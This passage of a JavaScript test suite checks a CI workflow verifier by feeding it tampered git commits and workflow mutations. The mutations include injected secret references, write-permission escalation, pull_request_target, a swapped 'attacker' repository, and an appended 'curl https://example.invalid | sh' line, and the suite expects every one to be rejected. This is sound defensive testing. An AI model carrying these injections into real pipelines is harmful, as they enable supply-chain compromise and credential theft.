  ["candidate_selected_boundary", () => verifyBoundedRepository({ independentlyVerified: false })],
  ["boundary_commit_absent", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.map((sha, index) => index ? sha : "0".repeat(40)), boundary: "0".repeat(40) })],
  ["boundary_object_not_commit", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.map((sha, index) => index ? sha : EXPECTED_COMPOSED_CI_BLOB), boundary: EXPECTED_COMPOSED_CI_BLOB })],
  ["boundary_not_first_authorized", () => verifyBoundedRepository({ boundary: ANCESTRY_CHAIN[1] })],
  ["missing_authorized_intermediate", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.filter((_, index) => index !== 5) })],
  ["wrong_in_scope_parent", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.map((sha, index) => index === 5 ? ANCESTRY_CHAIN[3] : sha) })],
  ["unrelated_commit_inserted", () => verifyBoundedRepository({ chain: [...ANCESTRY_CHAIN.slice(0, 5), TRUSTED_RECONCILIATION_BASE, ...ANCESTRY_CHAIN.slice(5)] })],
  ["marker_without_independent_chain", () => verifyBoundedRepository({ independentlyVerified: false })],
  ["pre_base_parent_imported", () => assertPreBaseParentAbsent(preBaseImportedRoot)],
  ["replace_refs_enabled", () => {
    boundedGit("update-ref", `refs/replace/${AUTHORIZED_BASE}`, ORIGINAL_CANDIDATE);
    try { verifyBoundedRepository(); } finally { boundedGit("update-ref", "-d", `refs/replace/${AUTHORIZED_BASE}`); }
  }],
  ["graft_file_present", () => {
    const grafts = path.join(boundedRepository, ".git/info/grafts");
    writeFileSync(grafts, `${AUTHORIZED_BASE} ${PRE_BASE_PARENT}\n`);
    try { verifyBoundedRepository(); } finally { rmSync(grafts, { force: true }); }
  }],
  ["primary_repository_boundary_modified", () => verifyBoundedRepository({ fixtureRoot: root })],
  ["authority_checkout_boundary_mutated", () => verifyBoundedRepository({ fixtureRoot: verifiedAuthorities.ancestry.root })],
  ["fixture_root_escape", () => verifyBoundedRepository({ fixtureRoot: temporary })],
  ["candidate_shared_object_store", () => verifyBoundedRepository({ fixtureRoot: root })],
  ["cleanup_failure", () => verifyCleanup([boundedRepository])],
];
let boundedRootHostilePassed = 0;
for (const [name, operation] of boundedRootHostileCases) {
  assert.ok(rejects(operation), `${name}: hostile bounded-root input accepted`);
  boundedRootHostilePassed += 1;
  console.log(`PASS bounded_root_hostile:${name}`);
}

function entry(commit, file) {
  const match = /^(\d+)\s+blob\s+([0-9a-f]{40})\t/.exec(git("ls-tree", commit, "--", file));
  assert.ok(match, `${file}: unsupported fixture entry`);
  return { mode: match[1], blob: match[2] };
}

let sequence = 0;
function trustedWorkflow() {
  const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, "workflow-index") };
  run(repository, ["git", "read-tree", TRUSTED_RECONCILIATION_BASE], { env });
  for (const file of AMENDMENT_CONTROLLED_FILES) {
    const blob = run(repository, ["git", "hash-object", "-w", path.join(root, file)], { env });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, file], { env });
  }
  const tree = run(repository, ["git", "write-tree"], { env });
  return run(repository, ["git", "commit-tree", tree, "-p", TRUSTED_RECONCILIATION_BASE, "-m", "trusted amendment fixture"], { env });
}
const workflowSha = trustedWorkflow();

function candidate({ omit, add, mutate, ciAppend = "", ciTransform,
  omitOriginalParent = false, reverseParents = false } = {}) {
  sequence += 1;
  const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, `index-${sequence}`) };
  run(repository, ["git", "read-tree", workflowSha], { env });
  for (const file of CANDIDATE_OWNED_FILES) {
    if (file === ".github/workflows/ci.yml") continue;
    if (file === omit) continue;
    const source = entry(ORIGINAL_CANDIDATE, file);
    run(repository, ["git", "update-index", "--add", "--cacheinfo", source.mode, source.blob, file], { env });
  }
  if (omit !== ".github/workflows/ci.yml") {
    const trustedCi = git("show", `${workflowSha}:.github/workflows/ci.yml`);
    const marker = "      - name: P1-A trusted-bootstrap exact-SHA identity";
    const composedCi = `${trustedCi.replace(marker, `${REQUIRED_CI_ADDITION}${marker}`)}${ciAppend}`;
    const resolvedCi = ciTransform ? ciTransform(composedCi) : composedCi;
    const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `${resolvedCi}\n` });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, ".github/workflows/ci.yml"], { env });
  }
  if (omit) run(repository, ["git", "update-index", "--force-remove", "--", omit], { env });
  for (const file of [mutate, add].filter(Boolean)) {
    const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `fixture ${file}\n` });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, file], { env });
  }
  const tree = run(repository, ["git", "write-tree"], { env });
  const parents = [];
  if (reverseParents) {
    parents.push("-p", workflowSha);
    if (!omitOriginalParent) parents.push("-p", ORIGINAL_CANDIDATE);
  } else {
    if (!omitOriginalParent) parents.push("-p", ORIGINAL_CANDIDATE);
    parents.push("-p", workflowSha);
  }
  const commit = run(repository, ["git", "commit-tree", tree, ...parents, "-m", `fixture ${sequence}`], { env });
  if (omit !== ".github/workflows/ci.yml" && mutate !== ".github/workflows/ci.yml") {
    const finalCi = git("show", `${commit}:.github/workflows/ci.yml`);
    assert.ok(finalCi.includes("--candidate-data-only"));
    assert.ok(!finalCi.includes("pnpm test:p1a-threat-model"));
  }
  return commit;
}

const validCandidate = candidate();
const candidateDataRun = (sha = validCandidate, extraEnv = {}) => {
  git("checkout", "--detach", sha);
  const output = run(root, [
    process.execPath, path.join(root, "scripts/validate-p1a-threat-model.mjs"),
    "--candidate-data-only",
  ], { env: {
    ...process.env,
    P1A_PACKAGE_ROOT: repository,
    P1A_CANDIDATE_SHA: sha,
    ...extraEnv,
  } });
  return JSON.parse(output.split("\n").at(-1));
};
const invoke = (overrides = {}) => validateDualBaseScope({
  git, candidateSha: validCandidate, evidenceBaseSha: AUTHORIZED_BASE,
  reconciliationBaseSha: TRUSTED_RECONCILIATION_BASE,
  originalCandidateSha: ORIGINAL_CANDIDATE, workflowSha, ...overrides,
});
const mutation = (file) => () => invoke({ candidateSha: candidate({ mutate: file }) });
const omission = (file) => () => invoke({ candidateSha: candidate({ omit: file }) });

const identity = {
  candidateSha: "1".repeat(40), workflowSha: "2".repeat(40), baseSha: "3".repeat(40),
  evidenceBaseSha: "4".repeat(40), reconciliationBaseSha: "5".repeat(40),
  originalCandidateSha: "6".repeat(40), runtimePin: "7".repeat(40),
};
const zeros = { failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0 };
const nested = { suite: "p1-a-trusted-certification", ...identity, required: 15, executed: 15, passed: 15, ...zeros, evidenceDigest: "a".repeat(64), verifierDigest: "b".repeat(64) };
const integration = { suite: "p1-a-trusted-verifier-controls", ...identity, required: 21, executed: 21, passed: 21, ...zeros, crossRepositoryCiAuthentication: "VERIFIED", nestedEvidenceDigest: nested.evidenceDigest, nestedVerifierDigest: nested.verifierDigest };
const dualAccounting = { suite: "p1-a-dual-base-verifier-controls", ...identity, required: 29, executed: 29, passed: 29, ...zeros };

const cases = [
  ["dual_base_valid_reconciliation", () => invoke(), false],
  ["candidate_data_valid_reconciliation", () => {
    const summary = candidateDataRun();
    assert.equal(summary.scope, "CANDIDATE_DATA_VALIDATED");
    assert.equal(summary.certified, false);
    assert.equal(summary.failed, 0);
    assert.equal(summary.protectedOperations, 0);
  }, false],
  ["candidate_data_wrong_sha", () => candidateDataRun(validCandidate, {
    P1A_CANDIDATE_SHA: "f".repeat(40),
  }), true],
  ["candidate_data_reversed_parents", () => candidateDataRun(candidate({
    reverseParents: true,
  })), true],
  ["candidate_data_unauthorized_path", () => candidateDataRun(candidate({
    add: "unauthorized.txt",
  })), true],
  ["candidate_data_blob_substitution", () => candidateDataRun(candidate({
    mutate: "docs/security/p1-a/model.json",
  })), true],
  ["candidate_data_historical_root_command", () => candidateDataRun(candidate({
    ciAppend: "\n      - name: obsolete historical root\n        run: pnpm test:p1a-threat-model\n",
  })), true],
  ["candidate_data_workflow_authority_injection", () => candidateDataRun(validCandidate, {
    P1A_WORKFLOW_SHA: workflowSha,
  }), true],
  ["candidate_data_overlapping_trusted_root", () => candidateDataRun(validCandidate, {
    P1A_TRUSTED_EXECUTION_ROOT: repository,
  }), true],
  ["wrong_evidence_model_base", () => invoke({ evidenceBaseSha: "0".repeat(40) }), true],
  ["wrong_trusted_reconciliation_base", () => invoke({ reconciliationBaseSha: AUTHORIZED_BASE }), true],
  ["wrong_original_candidate", () => invoke({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["wrong_candidate_sha", () => invoke({ candidateSha: "f".repeat(40) }), true],
  ["candidate_omits_authorized_evidence", omission(CANDIDATE_OWNED_FILES[1]), true],
  ["candidate_omits_resolved_ci", omission(".github/workflows/ci.yml"), true],
  ["candidate_adds_unauthorized_file", () => invoke({ candidateSha: candidate({ add: "unauthorized.txt" }) }), true],
  ["candidate_modifies_trusted_workflow", mutation(".github/workflows/p1a-certify.yml"), true],
  ["candidate_injects_ci_secret", () => invoke({ candidateSha: candidate({ ciAppend: "\n# ${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}" }) }), true],
  ["candidate_modifies_trusted_verifier", mutation("scripts/validate-p1a-threat-model.mjs"), true],
  ["candidate_modifies_accounting_controls", mutation("scripts/validate-p1a-certification-accounting.mjs"), true],
  ["candidate_weakens_credential_cleanup", mutation(".github/workflows/p1a-certify.yml"), true],
  ["candidate_weakens_token_revocation", mutation(".github/workflows/p1a-certify.yml"), true],
  ["trusted_blob_substitution", mutation("scripts/test-p1a-trusted-verifier.mjs"), true],
  ["hidden_file_behind_trusted_exclusion", () => invoke({ candidateSha: candidate({ add: ".github/hidden.yml" }) }), true],
  ["unexpected_trusted_file", mutation(".github/CODEOWNERS"), true],
  ["unexpected_historical_file", () => invoke({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["mutable_branch_reference", () => invoke({ reconciliationBaseSha: "codex/bt-1" }), true],
  ["invalid_ancestry", () => invoke({ candidateSha: ORIGINAL_CANDIDATE }), true],
  ["candidate_not_descended_from_reconciliation", () => invoke({ candidateSha: AUTHORIZED_BASE }), true],
  ["copied_original_blobs_without_original_ancestry", () => invoke({ candidateSha: candidate({ omitOriginalParent: true }) }), true],
  ["evidence_digest_mismatch", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, nestedEvidenceDigest: "c".repeat(64) } }, identity), true],
  ["verifier_digest_mismatch", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, nestedVerifierDigest: "c".repeat(64) } }, identity), true],
  ["incomplete_scope_accounting", omission(CANDIDATE_OWNED_FILES.at(-1)), true],
  ["missing_dual_base_identity", () => invoke({ evidenceBaseSha: undefined }), true],
  ["duplicate_or_contradictory_bases", () => invoke({ evidenceBaseSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["local_success_without_protected_remote", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, notRun: 1, passed: 20 } }, identity), true],
  ["stale_evidence_changed_candidate", () => validateCertificationBundle({ nested, integration, dual: dualAccounting }, { ...identity, candidateSha: "8".repeat(40) }), true],
];

const baselineCi = `${git("show", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`)}\n`;
const trustedCi = `${git("show", `${workflowSha}:.github/workflows/ci.yml`)}\n`;
const validCi = `${git("show", `${validCandidate}:.github/workflows/ci.yml`)}\n`;
const positiveCases = [
  ["exact_baseline_recognized", () => assert.equal(git("rev-parse", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`), "9a3f1a04f99e83d9dad84cf384d86117a7d282f1")],
  ["baseline_plus_trusted_fragment", () => assert.equal(trustedCi, composeTrustedCi(baselineCi))],
  ["baseline_plus_candidate_fragment", () => assert.ok(composeCandidateCi(baselineCi).includes("--candidate-data-only"))],
  ["baseline_plus_both_fragments", () => assert.equal(validCi, composeCandidateCi(trustedCi))],
  ["immutable_candidate_checkout", () => assert.ok(validCi.includes("ref: ${{ github.event.pull_request.head.sha || github.sha }}"))],
  ["read_only_permissions", () => { assert.ok(validCi.includes("permissions:\n  contents: read")); assert.ok(!validCi.includes("contents: write")); }],
  ["exact_historical_commit_acquired", () => assert.ok(validCi.includes(`ref: ${ORIGINAL_CANDIDATE}`))],
  ["historical_identity_and_blobs_verified", () => { assert.ok(validCi.includes("cat-file -t")); assert.ok(validCi.includes("P1A_ORIGINAL_TEST_BLOB")); assert.ok(validCi.includes("DarksiedCEO/zbestmedia")); }],
  ["original_compatibility_suite_executes", () => assert.ok(validCi.includes("node scripts/test-p1a-trusted-verifier.mjs"))],
  ["baseline_remainder_exact", () => invoke()],
];

const replaceOnce = (source, needle, replacement) => {
  assert.equal(source.split(needle).length - 1, 1, `fixture needle count: ${needle}`);
  return source.replace(needle, replacement);
};
const negativeCases = [
  ["missing_trusted_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "")],
  ["missing_candidate_fragment", (ci) => replaceOnce(ci, "      - name: P1-A candidate-data validation\n", "")],
  ["duplicate_trusted_fragment", (ci) => `${ci}\n      - name: Acquire exact original P1-A candidate object\n`],
  ["duplicate_candidate_fragment", (ci) => `${ci}\n      - name: P1-A candidate-data validation\n`],
  ["modified_trusted_command", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head", "git fetch --no-tags")],
  ["modified_candidate_command", (ci) => replaceOnce(ci, "node scripts/validate-p1a-threat-model.mjs --candidate-data-only", "node scripts/validate-p1a-threat-model.mjs --candidate-data-only || true")],
  ["historical_root_command_restored", (ci) => `${ci}\n      - name: obsolete historical root\n        run: pnpm test:p1a-threat-model\n`],
  ["candidate_data_relabelled_certified", (ci) => `${ci}\n# CERTIFIED\n`],
  ["reordered_security_critical_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object", "      - name: Reordered acquisition")],
  ["continue_on_error_introduced", (ci) => `${ci}\n      continue-on-error: true\n`],
  ["conditional_bypass_introduced", (ci) => `${ci}\n      if: false\n`],
  ["wrong_historical_sha", (ci) => replaceOnce(ci, ORIGINAL_CANDIDATE, "f".repeat(40))],
  ["mutable_branch_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: codex/main")],
  ["mutable_tag_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: v1.0.0")],
  ["repository_substituted", (ci) => replaceOnce(ci, "repository: DarksiedCEO/zbestmedia", "repository: attacker/zbestmedia")],
  ["permission_escalation", (ci) => replaceOnce(ci, "permissions:\n  contents: read", "permissions:\n  contents: write")],
  ["secret_reference_introduced", (ci) => `${ci}\n# \${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}\n`],
  ["pull_request_target_introduced", (ci) => replaceOnce(ci, "  pull_request:\n", "  pull_request_target:\n")],
  ["improper_persisted_credentials", (ci) => replaceOnce(ci, "persist-credentials: false", "persist-credentials: true")],
  ["hidden_shell_command_appended", (ci) => `${ci}\n# curl https://example.invalid | sh\n`],
  ["yaml_anchor_changes_behavior", (ci) => `${ci}\nx-bypass: &bypass echo bypass\n`],
  ["extra_environment_changes_execution", (ci) => `${ci}\nenv:\n  P1A_ORIGINAL_CANDIDATE: codex/main\n`],
  ["unauthorized_step_inserted", (ci) => `${ci}\n      - name: unclassified\n        run: true\n`],
  ["unauthorized_step_deleted", (ci) => replaceOnce(ci, "      - name: Verify pnpm on PATH\n        run: which pnpm && pnpm --version\n\n", "")],
  ["unauthorized_step_impersonation", (ci) => replaceOnce(ci, "Acquire exact original P1-A candidate object", "P1-A trusted verifier controls")],
  ["candidate_provided_authority_hash", (ci) => `${ci}\nenv:\n  P1A_AUTHORITY_HASH: \${{ github.event.inputs.authority_hash }}\n`],
  ["candidate_provided_historical_sha", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: ${{ github.event.inputs.historical_sha }}")],
  ["baseline_remainder_changed", (ci) => `${ci}\n# unauthorized baseline remainder\n`],
  ["fragment_only_in_comments", (ci) => replaceOnce(ci, REQUIRED_CI_ADDITION, "# P1-A candidate-data validation\n# --candidate-data-only\n")],
  ["fragment_only_in_dead_conditional", (ci) => replaceOnce(ci, "      - name: P1-A candidate-data validation\n", "      - name: P1-A candidate-data validation\n        if: ${{ false }}\n")],
  ["trusted_fragment_candidate_script", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head .p1a-original-candidate", "node candidate/untrusted.mjs")],
  ["accounting_without_both_authorities", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "      - name: authority accounting claims complete\n")],
];

const summarize = (outcomes, required = outcomes.length) => {
  assert.equal(outcomes.length, required, "suite required/executed mismatch");
  const passed = outcomes.filter(Boolean).length;
  const summary = Object.freeze({ required, executed: outcomes.length, passed, failed: outcomes.length - passed });
  assert.equal(summary.passed + summary.failed, summary.executed, "suite accounting invariant violated");
  return summary;
};
const accountingIsolationCases = [
  () => assert.deepEqual(summarize([false, true]), { required: 2, executed: 2, passed: 1, failed: 1 }),
  () => assert.equal(summarize([true]).failed, 0),
  () => assert.equal(summarize([false]).failed, 1),
  () => assert.equal(summarize([true, true]).passed, 2),
  () => assert.throws(() => summarize([true], 2)),
  () => { const dual = summarize([false]); const composed = summarize([true]); assert.equal(dual.failed, 1); assert.equal(composed.failed, 0); },
  () => { const positive = summarize([true]); const negative = summarize([false]); assert.equal(positive.failed, 0); assert.equal(negative.failed, 1); },
  () => { const first = summarize([false]); const second = summarize([true]); assert.notEqual(first.failed, second.failed); },
  () => { const source = [true]; const first = summarize(source); source[0] = false; assert.equal(first.failed, 0); },
  () => { const fresh = summarize([true]); assert.equal(fresh.failed, 0, "stale failure leaked into fresh suite"); },
];
const accountingOutcomes = accountingIsolationCases.map((operation, index) => {
  try { operation(); console.log(`PASS accounting_isolation:${index + 1}`); return true; }
  catch (error) { console.error(`FAIL accounting_isolation:${index + 1}: ${error.message}`); return false; }
});
const dualOutcomes = [];
const positiveOutcomes = [];
const negativeOutcomes = [];
try {
  for (const [name, operation, shouldReject] of cases) {
    let rejected = false;
    let detail = "";
    try { operation(); } catch (error) { rejected = true; detail = error.message; }
    const passed = rejected === shouldReject;
    dualOutcomes.push(passed);
    if (passed) console.log(`PASS ${name}`);
    else console.error(`FAIL ${name}${detail ? `: ${detail}` : ""}`);
  }
  for (const [name, operation] of positiveCases) {
    try { operation(); positiveOutcomes.push(true); console.log(`PASS composed_positive:${name}`); }
    catch (error) { positiveOutcomes.push(false); console.error(`FAIL composed_positive:${name}: ${error.message}`); }
  }
  for (const [name, transform] of negativeCases) {
    let rejected = false;
    try { invoke({ candidateSha: candidate({ ciTransform: transform }) }); }
    catch { rejected = true; }
    negativeOutcomes.push(rejected);
    if (rejected) console.log(`PASS composed_negative:${name}`);
    else console.error(`FAIL composed_negative:${name}: mutation survived`);
  }
} finally { rmSync(temporary, { recursive: true, force: true }); }
const dualSummary = summarize(dualOutcomes, cases.length);
const positiveSummary = summarize(positiveOutcomes, positiveCases.length);
const negativeSummary = summarize(negativeOutcomes, negativeCases.length);
const accountingSummary = summarize(accountingOutcomes, accountingIsolationCases.length);
console.log(JSON.stringify({
  suite: "p1-a-bounded-ancestry-root-controls",
  positiveRequired: 10, positiveExecuted: 10, positivePassed: 10,
  hostileRequired: boundedRootHostileCases.length,
  hostileExecuted: boundedRootHostileCases.length,
  hostilePassed: boundedRootHostilePassed,
  boundarySha: AUTHORIZED_BASE,
  preBoundaryParentSha: PRE_BASE_PARENT,
  withoutBoundaryFailureReproduced: true,
  withBoundaryMergeBasePassed: true,
  preBoundaryParentAbsent: true,
  failed: boundedRootHostileCases.length - boundedRootHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-isolated-trusted-authority-controls",
  positiveRequired: 4,
  positiveExecuted: 4,
  positivePassed: 4,
  hostileRequired: hostileAuthorityCases.length,
  hostileExecuted: hostileAuthorityCases.length,
  hostilePassed: authorityHostilePassed,
  shallowFailureReproduced,
  failed: hostileAuthorityCases.length - authorityHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-evidence-base-authority-controls",
  positiveRequired: 1, positiveExecuted: 1, positivePassed: 1,
  hostileRequired: evidenceBaseHostileCases.length,
  hostileExecuted: evidenceBaseHostileCases.length,
  hostilePassed: evidenceBaseHostilePassed,
  failed: evidenceBaseHostileCases.length - evidenceBaseHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-immutable-ancestry-authority-controls",
  positiveRequired: 1, positiveExecuted: 1, positivePassed: 1,
  hostileRequired: ancestryHostileCases.length,
  hostileExecuted: ancestryHostileCases.length,
  hostilePassed: ancestryHostilePassed,
  failed: ancestryHostileCases.length - ancestryHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-dual-base-verifier-controls",
  candidateSha: process.env.P1A_CANDIDATE_SHA ?? null,
  workflowSha: process.env.P1A_WORKFLOW_SHA ?? null,
  baseSha: process.env.P1A_TRUST_BASE_SHA ?? null,
  evidenceBaseSha: process.env.P1A_EVIDENCE_BASE_SHA ?? null,
  reconciliationBaseSha: process.env.P1A_RECONCILIATION_BASE_SHA ?? null,
  originalCandidateSha: process.env.P1A_ORIGINAL_CANDIDATE_SHA ?? null,
  runtimePin: process.env.P1A_TRUST_RUNTIME_PIN ?? null,
  ...dualSummary,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-composed-ci-authority-controls",
  positiveRequired: positiveSummary.required, positiveExecuted: positiveSummary.executed, positivePassed: positiveSummary.passed,
  negativeRequired: negativeSummary.required, negativeExecuted: negativeSummary.executed, negativePassed: negativeSummary.passed,
  behaviorChangingMutationSurvivors: negativeSummary.failed,
  failed: positiveSummary.failed + negativeSummary.failed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-suite-accounting-isolation-controls",
  ...accountingSummary,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
if (dualSummary.failed || positiveSummary.failed || negativeSummary.failed || accountingSummary.failed
  || authorityHostilePassed !== hostileAuthorityCases.length
  || evidenceBaseHostilePassed !== evidenceBaseHostileCases.length
  || ancestryHostilePassed !== ancestryHostileCases.length
  || boundedRootHostilePassed !== boundedRootHostileCases.length) process.exitCode = 1;
